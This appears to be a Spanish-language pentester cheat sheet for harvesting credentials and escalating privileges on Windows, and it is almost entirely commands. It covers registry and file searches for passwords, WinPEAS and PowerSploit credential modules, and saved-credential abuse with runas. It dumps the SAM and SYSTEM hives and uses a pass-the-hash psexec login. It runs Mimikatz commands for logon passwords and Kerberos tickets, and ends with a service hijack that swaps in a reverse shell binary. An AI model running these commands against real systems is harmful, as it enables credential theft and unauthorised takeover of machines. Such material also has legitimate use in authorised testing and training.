# Formas tipicas de encontrar contraseñas o escalar privilegios en Windows

- WinPEAS
- PowerSploit
- Save Creds
- Sam y System
- Archivos de Configuracion
- Registro
+ Posibles Escaladas de Privilegios
+ Insecure Service Permissions 

# - Registro
```powershell
reg query HKLM /f password /t REG_SZ /s

reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
```
Para contraseñas en Putty
```powershell
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
```
# WinPEAS
```powershell
winPEAS.exe quiet filesinfo userinfo
winPEAS.exe quiet windowscreds
winPEAS.exe quiet searchfast filesinfo
```

# PowerSploit
Estos son sus modulos a probar
```powershell
Get-UnattendedInstallFile
Get-Webconfig
Get-ApplicationHost
Get-SiteListPassword
Get-CachedGPPPassword
Get-RegistryAutoLogon
``` 
# Credenciales Guardadas
```cmd
cmdkey /list
``` 
Runas --> en Caso de Tener credenciales guardadas de otro usuario podriamos ejecutar acciones o binarios
```powershell
runas /savecred /user:<usuario> <ejecutable> 
```

# Script para enumerar Otras interfaces
```cmd
for /L %i in (1,1,255) do @ping -n 1 -w 200 192.168.1.%i > nul && echo 192.168.1.%i is up.
```

# Archivos de Configuracion
Buscando por archivos que contengan la palabra pass o extension .config
```cmd
dir /s *pass* == *.config
```
Buscando por archivos que contengan la palabra password y acaben por la extension .xml
```cmd
findstr /si password *.xml *.ini
```
- Modulo de Metasploit para buscar por password recursivamente
post/windows/gather/enum_unattend

# Sam y System
Los archivos SAM y SYSTEM, se almacenan en el directorio:
```cmd
C:\Windows\System32\config
```
Buscando por Backups de Sam y System
```cmd
C:\Windows\Repair
C:\Windows\System32\config\RegBack
```
Si los hubiesemos encontrado o tuviesemos privilegios para realizar una copia de los mismos
```
reg save HKLM\SAM SAM.backup
reg save HKLM\SYSTEM SYSTEM.backup
```

```
psexec.py -hashes 'aad3b435b51404eeaad3b435b51404ee:f58b86e89c8631e432cf1a0232362853f' WORKGROUP/administrator@11.111.128.10 cmd
```

# Mimikatz

````bash
privilege::debug

sekurlsa::logonpasswords
sekurlsa::tickets /export

kerberos::list /export

vault::cred
vault::list

lsadump::sam
lsadump::secrets
lsadump::cache
````

Si por un casual no nos funcionara probar de esta forma, (importante)
````bash
.\mimikatz "privilege::debug" "sekurlsa::logonpasswords" exit

````

# PowerShell LDAP Script TGT or TGS

````bash
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

$PDC = ($domainObj.PdcRoleOwner).Name

$SearchString = "LDAP://"

$SearchString += $PDC + "/"

$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"

$SearchString += $DistinguishedName

$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)

$objDomain = New-Object System.DirectoryServices.DirectoryEntry

$Searcher.SearchRoot = $objDomain

$Searcher.filter="samAccountType=805306368"

$Result = $Searcher.FindAll()

Foreach($obj in $Result)
{
    Foreach($prop in $obj.Properties)
    {
        $prop
    }
    
    Write-Host "------------------------"
}

````

# Escaladas de Privilegios
1.- Insecure Service Permissions 
Procedemos a usar winPEAS para identificar los posibles ejecutables mirando en "Services Information"

Procedemos a usar el comando 
`$ sc qc 'NombreArchivo'`

Con el siguiente comando comprobamos los permisos que tenemos sobre el mismo.
```bash
C:\PrivEsc\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"

Medium Mandatory Level (Default) [No-Write-Up]
  RW Everyone
        FILE_ALL_ACCESS
  RW NT AUTHORITY\SYSTEM
        FILE_ALL_ACCESS
  RW BUILTIN\Administrators
        FILE_ALL_ACCESS
  RW WIN-QBA94KB3IOF\Administrator
        FILE_ALL_ACCESS
  RW BUILTIN\Users
        FILE_ALL_ACCESS
```

Una vez comprobados y viendo que tenemos la posibilidad de Hijackear el servicio por otro procedemos a crear un revshell con el nombre del servicio
```bash
copy C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe" /Y
``` 

Habiendolo copiado, procedemos a iniciar el servicio fake
```bash
net start filepermsvc
```
